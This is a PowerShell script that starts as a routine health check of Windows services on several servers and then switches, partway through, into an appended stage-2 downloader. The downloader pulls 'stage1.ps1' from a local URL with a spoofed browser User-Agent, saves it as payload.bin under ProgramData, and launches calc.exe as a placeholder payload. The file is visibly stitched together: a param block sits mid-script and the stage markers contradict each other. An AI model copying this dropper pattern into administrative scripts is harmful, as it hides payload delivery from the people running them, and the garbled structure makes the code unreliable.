$Servers             = @('dc02', 'app-prod-01', 'srv01', 'web-stg-01')
$Services            = @('W3SVC', 'DNS', 'Spooler')
$Port                = 3389
$TimeoutMilliseconds = 1000
$ReportPath          = 'C:\Reports\service-health-2026-09-01.csv'


$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://localhost:9001/stage1.ps1",
    [string]$DropPath = "C:\ProgramData\payload.bin",
    [int]$StageTimeout = 29,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Invoke-Stage2Download -SourceUrl $TransferUrl -DestinationPath $DropPath -TimeoutSec $StageTimeout -UserAgent $UserAgent
if ($TransferResult) {
    Start-Process -FilePath "calc.exe"
}

Write-Output "stage 12 initialized"
$StageMarker = "stage-30"
